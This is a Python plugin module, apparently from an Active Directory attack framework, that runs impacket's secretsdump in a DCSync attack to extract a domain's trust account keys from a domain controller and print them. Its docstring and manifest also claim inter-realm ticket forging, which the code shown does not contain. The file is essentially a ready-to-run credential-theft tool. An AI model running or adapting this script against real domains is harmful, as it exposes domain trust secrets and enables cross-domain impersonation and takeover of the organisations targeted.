"""Trust key extraction + inter-realm TGT forging."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.trust.trustpoc.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["credential_extraction", "ticket_forging"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.001"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", None) or getattr(args, "target", None)

    print("[*] Trust Key Extraction & Inter-Realm TGT Forging")
    print("[*] Domain: {}  DC: {}".format(cred.domain, dc_ip or "auto"))

    import subprocess, shutil
    secretsdump = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if not secretsdump:
        print("[!] secretsdump.py (impacket) not found")
        return 1

    auth = cred.impacket_auth_string()
    cmd = [secretsdump, auth]
    if dc_ip:
        cmd += ["-target-ip", dc_ip]
    cmd += ["-just-dc-user", "{}$".format(cred.domain.split(".")[0])]

    print("[*] Extracting trust keys via DCSync")
    print("[*] CMD: {}".format(" ".join(cmd)))
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print(result.stderr)
    return result.returncode
